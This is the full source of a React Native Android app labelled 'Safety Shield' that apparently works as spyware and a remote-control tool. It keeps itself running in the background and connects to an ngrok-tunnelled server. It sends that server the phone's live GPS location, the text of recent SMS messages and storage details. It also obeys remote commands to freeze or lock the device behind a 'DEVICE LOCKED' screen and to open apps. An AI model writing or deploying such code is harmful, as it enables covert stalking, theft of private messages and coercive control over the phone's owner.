import React, { useEffect, useState, useRef } from 'react';
import { 
  StatusBar, StyleSheet, View, Text, Alert, 
  PermissionsAndroid, Platform, Linking, 
  NativeModules, BackHandler, TouchableOpacity 
} from 'react-native';
import Geolocation from 'react-native-geolocation-service';
import DeviceInfo from 'react-native-device-info';
import io from 'socket.io-client';
import SmsAndroid from 'react-native-get-sms-android';
import BackgroundService from 'react-native-background-actions';
import SendIntentAndroid from 'react-native-send-intent';

const { LockModule } = NativeModules;
const SERVER_URL = 'https://subopaquely-podophyllic-nicola.ngrok-free.dev'; 

const options = {
  taskName: 'TrackerBackground',
  taskTitle: 'Safety Shield Active',
  taskDesc: 'Real-time monitoring enabled',
  taskIcon: { name: 'ic_launcher', type: 'mipmap' },
  color: '#ff00ff',
  parameters: { delay: 15000 },
};

// Background Task: Keeps the service alive
const backgroundTask = async (taskDataArguments: any) => {
  await new Promise<void>(async (resolve) => {
    for (let i = 0; BackgroundService.isRunning(); i++) {
      await BackgroundService.updateNotification({ taskDesc: `System secured for ${i * 15}s` });
      await new Promise((res) => setTimeout(res, taskDataArguments.delay));
    }
  });
};

function App() {
  const [deviceId, setDeviceId] = useState('');
  const [location, setLocation] = useState({ lat: 0, lon: 0 });
  const [socketConnected, setSocketConnected] = useState(false);
  const [isFrozen, setIsFrozen] = useState(false);
  
  const socketRef = useRef<any>(null);
  const watchIdRef = useRef<number | null>(null);

  // Block Back Button when Frozen
  useEffect(() => {
    const backHandler = BackHandler.addEventListener('hardwareBackPress', () => isFrozen);
    return () => backHandler.remove();
  }, [isFrozen]);

  useEffect(() => {
    const init = async () => {
      const id = await DeviceInfo.getUniqueId();
      setDeviceId(id);

      if (Platform.OS === 'android') {
        await requestPermissions();
      }

      const socket = io(SERVER_URL, {
        transports: ['websocket'],
        extraHeaders: { "ngrok-skip-browser-warning": "true" },
        reconnection: true,
        reconnectionAttempts: Infinity,
        pingTimeout: 60000,
        pingInterval: 25000
      });
      socketRef.current = socket;

      socket.on('connect', () => {
        setSocketConnected(true);
        socket.emit('register', id);
        // Initial Ping
        socket.emit('data', { deviceId: id, location: { lat: 0, lon: 0 }, sms: [], storage: { total: 0, free: 0 } });
      });

      socket.on('command', (data) => {
        if (data.deviceId === id) {
          const command = data.command.toLowerCase().trim();
          if (command === 'freeze') {
            setIsFrozen(true);
            LockModule.startPinning();
          } else if (command === 'unfreeze') {
            setIsFrozen(false);
            LockModule.stopPinning();
          } else if (command === 'lock') {
            LockModule.lockScreen().catch(() => Alert.alert('Error', 'Enable Admin first'));
          } else if (command.startsWith('open ')) {
            const target = command.substring(5);
            SendIntentAndroid.openApp(target, {}).then(res => {
              if(!res) Linking.openURL(`https://www.google.com/search?q=${target}`);
            });
          }
        }
      });

      socket.on('disconnect', () => setSocketConnected(false));

      startTracking(id);

      try {
        await BackgroundService.start(backgroundTask, options);
      } catch (e) { console.error(e); }
    };

    init();

    return () => {
      if (watchIdRef.current !== null) Geolocation.clearWatch(watchIdRef.current);
      BackgroundService.stop();
      if (socketRef.current) socketRef.current.disconnect();
    };
  }, []);

  const requestPermissions = async () => {
    const perms = [
      PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
      PermissionsAndroid.PERMISSIONS.READ_SMS,
      PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
    ];
    if (Number(Platform.Version) >= 33) perms.push(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
    await PermissionsAndroid.requestMultiple(perms);
    if (Number(Platform.Version) >= 29) {
      await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.ACCESS_BACKGROUND_LOCATION);
    }
  };

  const startTracking = (id: string) => {
    watchIdRef.current = Geolocation.watchPosition(
      (position) => {
        const coords = { lat: position.coords.latitude, lon: position.coords.longitude };
        setLocation(coords);
        
        // Data collection (Limited to save battery/latency)
        SmsAndroid.list(JSON.stringify({ maxCount: 5 }), (f) => {}, (count, smsList) => {
          const smsArray = JSON.parse(smsList).map((s: any) => s.body);
          DeviceInfo.getFreeDiskStorage().then(free => {
            if (socketRef.current?.connected) {
              socketRef.current.emit('data', { deviceId: id, location: coords, sms: smsArray, storage: { total: 0, free } });
            }
          });
        });
      },
      (err) => console.log(err),
      { enableHighAccuracy: true, distanceFilter: 10, interval: 15000 }
    );
  };

  if (isFrozen) {
    return (
      <View style={[styles.container, { backgroundColor: '#cc0000' }]}>
        <StatusBar hidden={true} />
        <Text style={styles.frozenText}>DEVICE LOCKED</Text>
        <Text style={styles.frozenSubText}>Contact Administrator</Text>
      </View>
    );
  }

  return (
    <View style={styles.container}>
      <Text style={styles.title}>Safety Active</Text>
      <View style={styles.infoCard}>
        <Text>ID: {deviceId}</Text>
        <Text style={{ color: socketConnected ? 'green' : 'red' }}>
          {socketConnected ? '● Online' : '● Offline (Connecting...)'}
        </Text>
      </View>
      <TouchableOpacity style={styles.button} onPress={() => LockModule.enableAdmin()}>
        <Text>Enable Admin Rights</Text>
      </TouchableOpacity>
      <Text style={styles.coords}>Location: {location.lat.toFixed(4)}, {location.lon.toFixed(4)}</Text>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#f5f5f5', padding: 25 },
  title: { fontSize: 26, fontWeight: 'bold', marginBottom: 30 },
  infoCard: { backgroundColor: 'white', padding: 20, borderRadius: 12, width: '100%', marginBottom: 20, elevation: 3 },
  button: { backgroundColor: '#fff', padding: 15, borderRadius: 10, width: '100%', alignItems: 'center', borderWidth: 1, borderColor: '#ddd' },
  coords: { marginTop: 30, color: '#888' },
  frozenText: { color: 'white', fontSize: 36, fontWeight: 'bold' },
  frozenSubText: { color: 'white', fontSize: 18, marginTop: 15 },
});

export default App;